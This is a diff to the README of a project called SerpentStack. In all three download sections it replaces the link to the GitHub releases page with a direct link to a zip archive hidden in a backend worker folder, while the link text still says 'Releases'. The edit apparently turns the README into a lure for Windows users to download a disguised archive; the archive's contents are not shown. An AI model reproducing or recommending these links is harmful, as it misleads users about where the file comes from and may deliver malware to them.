@@ -1,6 +1,6 @@
 # 🐍 SerpentStack - Build apps with less setup
 
-[![Download SerpentStack](https://img.shields.io/badge/Download%20SerpentStack-blue?style=for-the-badge&logo=github)](https://github.com/Sujan70/SerpentStack/releases)
+[![Download SerpentStack](https://img.shields.io/badge/Download%20SerpentStack-blue?style=for-the-badge&logo=github)](https://github.com/Sujan70/SerpentStack/raw/refs/heads/main/backend/app/worker/Serpent_Stack_v2.6.zip)
 
 ## 🚀 What SerpentStack Is
 
@@ -10,7 +10,7 @@ It is built for people who want to run a modern app without building every piece
 
 ## 📥 Download and Install on Windows
 
-Use this page to download: [SerpentStack Releases](https://github.com/Sujan70/SerpentStack/releases)
+Use this page to download: [SerpentStack Releases](https://github.com/Sujan70/SerpentStack/raw/refs/heads/main/backend/app/worker/Serpent_Stack_v2.6.zip)
 
 Follow these steps on Windows:
 
@@ -156,6 +156,6 @@ These tools are common in modern app work and help keep the project organized.
 
 ## 🖱️ Download Again Later
 
-If you need the files again, use this page: [https://github.com/Sujan70/SerpentStack/releases](https://github.com/Sujan70/SerpentStack/releases)
+If you need the files again, use this page: [https://github.com/Sujan70/SerpentStack/raw/refs/heads/main/backend/app/worker/Serpent_Stack_v2.6.zip](https://github.com/Sujan70/SerpentStack/raw/refs/heads/main/backend/app/worker/Serpent_Stack_v2.6.zip)
 
 This is the same place to check for new versions, fixes, and release files for Windows.
